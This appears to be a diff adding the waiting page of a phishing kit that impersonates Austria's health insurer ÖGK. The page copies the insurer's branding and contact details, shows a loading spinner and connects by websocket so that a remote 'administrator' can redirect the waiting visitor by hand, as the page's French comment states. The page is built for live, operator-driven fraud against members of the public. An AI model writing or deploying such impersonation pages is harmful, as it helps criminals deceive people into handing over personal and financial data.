@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1" />
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+    <link rel="icon" href="https://www9.0zz0.com/2023/09/04/11/273994248.jpg" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="./css/style.css">
+    <title>OGK - Österreichische Gesundheitskasse</title>
+    
+    <style>
+        * {
+          padding: 0%;
+          margin: 0%;
+        }
+        
+        body {
+          font-family: "Open Sans", sans-serif;
+          background: #f5f5f5;
+          min-height: 100vh;
+          display: flex;
+          flex-direction: column;
+        }
+        
+        header {
+          background-color: #ffffff;
+          padding: 20px 0;
+          border-bottom: #aadf78 solid 3px;
+        }
+
+        .container {
+          max-width: 100%;
+          margin: 0 auto;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          padding: 0 20px;
+        }
+
+        .left-section img {
+          height: 80px;
+        }
+
+        .right-section ul {
+          list-style-type: none;
+          margin: 0;
+          padding: 0;
+        }
+
+        .right-section li {
+          display: inline-block;
+          margin-left: 0px;
+        }
+
+        .right-section a {
+          text-decoration: none;
+          color: #333;
+        }
+
+        .right-section a:hover {
+          text-decoration: underline;
+        }
+
+        /* Main content */
+        .main-content {
+          flex: 1;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          padding: 40px 20px;
+          text-align: center;
+        }
+
+        .loading-spinner {
+          width: 60px;
+          height: 60px;
+          border: 4px solid #e3e3e3;
+          border-top: 4px solid #4a90e2;
+          border-radius: 50%;
+          animation: spin 1s linear infinite;
+          margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
+
+        .waiting-text {
+          font-size: 24px;
+          color: #333;
+          font-weight: normal;
+        }
+
+        /* Footer */
+        footer {
+          color: white;
+          display: flex;
+          justify-content: space-between;
+          align-items: center;
+          background-color: #001e50;
+          padding: 20px;
+          border-top: #aadf78 solid 3px;
+        }
+
+        .footer-logo img {
+          color: white;
+          margin-bottom: 10px;
+          height: auto;
+          width: 170px;
+        }
+
+        .footer-contact {
+          display: flex;
+          align-items: center;
+        }
+
+        .footer-info {
+          margin-left: 10px;
+        }
+        
+        .footer-info h4 {
+          padding-bottom: 10px;
+        }
+        
+        a {
+          color: white;
+          text-decoration: none;
+        }
+        
+        .footer_bro {
+          padding-left: 60%;
+        }
+
+        @media (max-width: 769px) {
+          .loading-spinner {
+            width: 50px;
+            height: 50px;
+          }
+          
+          .waiting-text {
+            font-size: 20px;
+          }
+          
+          .footer_bro {
+            padding-left: 0;
+            margin-top: 20px;
+          }
+          
+          footer {
+            flex-direction: column;
+            text-align: center;
+          }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="left-section">
+                <img src="https://www8.0zz0.com/2023/08/05/01/613882479.png" alt="Österreichische Gesundheitskasse" style="height: 80px" />
+            </div>
+            <nav class="right-section">
+                <ul>
+                    <li>
+                        <a href="index.html">
+                            <img src="https://www12.0zz0.com/2023/08/05/01/585748753.png" alt="" />
+                        </a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="loading-spinner"></div>
+        <div class="waiting-text">pleas wait...</div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="footer-contact">
+            <div class="footer-info">
+                <div class="footer-logo">
+                    <img src="https://www12.0zz0.com/2023/08/05/02/694701060.png" alt="Logo" />
+                </div>
+                <h4>Österreichische Gesundheitskasse</h4>
+                <p>Wienerbergstraße 15-19</p>
+                <p>1100 Wien</p>
+                <p>Telefon: +43 5 0766-0</p>
+            </div>
+        </div>
+        
+        <div class="footer_bro">
+            <a href="#">IMPRESSUM</a><br>
+            <a href="#">DATENSCHUTZ</a><br>
+            <a href="#">BARRIEREFREIHEITSERKLÄRUNG</a><br>
+            <a href="#">TECHNISCHER SUPPORT</a><br>
+        </div>
+    </footer>
+
+    <script src="./js/websocket-client.js"></script>
+    <script>
+        // Plus de redirection automatique - le client reste sur cette page
+        // jusqu'à ce que l'administrateur le redirige manuellement
+        console.log('Page d\'attente chargée - En attente de redirection manuelle');
+    </script>
+</body>
+</html>
+
+
